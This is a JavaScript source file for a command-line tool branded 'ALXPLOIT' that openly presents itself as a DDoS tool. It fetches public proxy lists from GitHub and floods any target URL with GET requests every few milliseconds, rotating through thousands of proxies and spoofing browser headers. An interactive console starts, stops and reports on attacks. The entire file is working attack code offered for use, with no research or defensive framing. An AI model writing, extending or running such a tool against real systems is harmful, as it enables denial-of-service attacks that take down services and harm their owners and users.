import axios from 'axios';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { SocksProxyAgent } from 'socks-proxy-agent';
import fs from 'fs';
import readline from 'readline';

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log(`
╔══════════════════════════════════════════════════════════════╗
║     █████╗ ██╗  ██╗ ██████╗ ██╗     ██████╗ ██╗████████╗    ║
║    ██╔══██╗╚██╗██╔╝██╔═══██╗██║     ╚════██╗██║╚══██╔══╝    ║
║    ███████║ ╚███╔╝ ██║   ██║██║      █████╔╝██║   ██║       ║
║    ██╔══██║ ██╔██╗ ██║   ██║██║     ██╔═══╝ ██║   ██║       ║
║    ██║  ██║██╔╝ ██╗╚██████╔╝███████╗███████╗██║   ██║       ║
║    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝       ║
║                ◥𝗗𝗥𝟰𝗞𝟰𝟳𝗛◤ ◥𝗧𝗘𝗔𝗠◤ - ALXPLOIT                 ║
║              🔥 DDOS TOOL - RIBUAN IP (PROXY) 🔥            ║
╚══════════════════════════════════════════════════════════════╝
`);

let attackInterval = null;
let isAttacking = false;
let currentStats = { total: 0, success: 0, failed: 0 };

function loadProxies(filePath = 'proxy.txt') {
    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        let proxies = content.split('\n').filter(line => line.trim() && !line.startsWith('#'));
        proxies = [...new Set(proxies)];
        console.log(`✓ Loaded ${proxies.length} proxies from ${filePath}\n`);
        return proxies;
    } catch (error) {
        console.error(`✗ Failed to load proxy.txt: ${error.message}`);
        console.log('  Run "node main.js --download-proxy" to download fresh proxies\n');
        return [];
    }
}

function getAgent(proxyUrl) {
    proxyUrl = proxyUrl.trim();
    if (proxyUrl.startsWith('socks')) {
        return new SocksProxyAgent(proxyUrl);
    }
    return new HttpsProxyAgent(proxyUrl);
}

async function sendRequest(targetUrl, proxy) {
    try {
        const agent = getAgent(proxy);
        const response = await axios.get(targetUrl, {
            httpAgent: agent,
            httpsAgent: agent,
            timeout: 15000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
        });
        return { status: response.status, success: true };
    } catch (error) {
        return { status: error.response?.status || 0, success: false };
    }
}

async function downloadProxies() {
    console.log("\n📥 Downloading proxies from sources...");
    
    const sources = [
        { url: 'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt', type: 'HTTP' },
        { url: 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt', type: 'HTTP' },
        { url: 'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt', type: 'HTTP' },
        { url: 'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt', type: 'SOCKS4' },
        { url: 'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt', type: 'SOCKS5' }
    ];
    
    let allProxies = [];
    
    for (const source of sources) {
        try {
            const response = await axios.get(source.url, { timeout: 10000 });
            const proxies = response.data.split('\n').filter(line => line.trim());
            allProxies.push(...proxies);
            console.log(`   ✓ ${source.type}: ${proxies.length} proxies`);
        } catch (error) {
            console.log(`   ✗ Failed: ${source.url.split('/').pop()}`);
        }
    }
    
    allProxies = [...new Set(allProxies)];
    fs.writeFileSync('proxy.txt', allProxies.join('\n'));
    console.log(`\n✓ Total ${allProxies.length} proxies saved to proxy.txt\n`);
    return allProxies;
}

async function startAttack(targetUrl, durationSeconds, proxies) {
    if (isAttacking) {
        console.log("⚠️ Attack already running! Use 'stop' first.\n");
        return;
    }
    
    if (!targetUrl.startsWith('http')) {
        console.log("❌ Target must start with http:// or https://\n");
        return;
    }
    
    if (proxies.length === 0) {
        console.log("❌ No proxies! Run 'download-proxy' first.\n");
        return;
    }
    
    isAttacking = true;
    currentStats = { total: 0, success: 0, failed: 0 };
    const endTime = Date.now() + (durationSeconds * 1000);
    let proxyIndex = 0;
    
    console.log(`\n🚀 ATTACK STARTED (DDoS with ${proxies.length} IPs)`);
    console.log(`   Target: ${targetUrl}`);
    console.log(`   Duration: ${durationSeconds} seconds\n`);
    
    const attackLoop = () => {
        if (!isAttacking || Date.now() >= endTime) {
            clearInterval(attackInterval);
            isAttacking = false;
            console.log(`\n✅ ATTACK COMPLETED`);
            console.log(`   Total Requests: ${currentStats.total}`);
            console.log(`   Successful: ${currentStats.success}`);
            console.log(`   Failed: ${currentStats.failed}`);
            console.log(`   Success Rate: ${((currentStats.success/currentStats.total)*100).toFixed(1)}%\n`);
            return;
        }
        
        const proxy = proxies[proxyIndex % proxies.length];
        proxyIndex++;
        
        sendRequest(targetUrl, proxy).then(result => {
            currentStats.total++;
            if (result.success) {
                currentStats.success++;
            } else {
                currentStats.failed++;
            }
            
            if (currentStats.total % 50 === 0) {
                console.log(`   📊 Requests: ${currentStats.total} | Success: ${currentStats.success} | Failed: ${currentStats.failed}`);
            }
        });
    };
    
    attackInterval = setInterval(attackLoop, 5);
}

function stopAttack() {
    if (!isAttacking) {
        console.log("⚠️ No attack running.\n");
        return;
    }
    clearInterval(attackInterval);
    isAttacking = false;
    console.log("\n🛑 Attack stopped by user.\n");
}

async function main() {
    const args = process.argv.slice(2);
    let proxies = [];
    
    if (args.includes('--download-proxy')) {
        proxies = await downloadProxies();
    } else {
        proxies = loadProxies();
    }
    
    console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    console.log("📋 COMMANDS:");
    console.log("  attack <url> <seconds>   - Start DDoS attack");
    console.log("  stop                     - Stop current attack");
    console.log("  download-proxy           - Download fresh proxies");
    console.log("  status                   - Show attack status");
    console.log("  help                     - Show this help");
    console.log("  exit                     - Exit tool");
    console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
    
    rl.on('line', async (input) => {
        const cmd = input.trim().toLowerCase();
        
        if (cmd.startsWith('attack ')) {
            const parts = cmd.split(' ');
            if (parts.length < 3) {
                console.log("❌ Usage: attack <url> <seconds>");
                console.log("   Example: attack http://192.168.1.1 60\n");
                return;
            }
            const target = parts[1];
            const duration = parseInt(parts[2]);
            if (isNaN(duration) || duration <= 0) {
                console.log("❌ Duration must be a positive number\n");
                return;
            }
            await startAttack(target, duration, proxies);
        }
        else if (cmd === 'stop') {
            stopAttack();
        }
        else if (cmd === 'download-proxy') {
            proxies = await downloadProxies();
        }
        else if (cmd === 'status') {
            if (isAttacking) {
                console.log(`\n📊 ATTACK STATUS:`);
                console.log(`   Running: YES`);
                console.log(`   Total Requests: ${currentStats.total}`);
                console.log(`   Successful: ${currentStats.success}`);
                console.log(`   Failed: ${currentStats.failed}\n`);
            } else {
                console.log(`\n📊 STATUS: No attack running.\n`);
                console.log(`   Proxies loaded: ${proxies.length}\n`);
            }
        }
        else if (cmd === 'help') {
            console.log("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
            console.log("📋 COMMANDS:");
            console.log("  attack <url> <seconds>   - Start DDoS attack");
            console.log("  stop                     - Stop current attack");
            console.log("  download-proxy           - Download fresh proxies");
            console.log("  status                   - Show attack status");
            console.log("  exit                     - Exit tool");
            console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
        }
        else if (cmd === 'exit') {
            if (isAttacking) stopAttack();
            console.log("👋 Exiting...\n");
            process.exit(0);
        }
        else if (cmd && cmd !== '') {
            console.log("❌ Unknown command. Type 'help'.\n");
        }
    });
}

main();
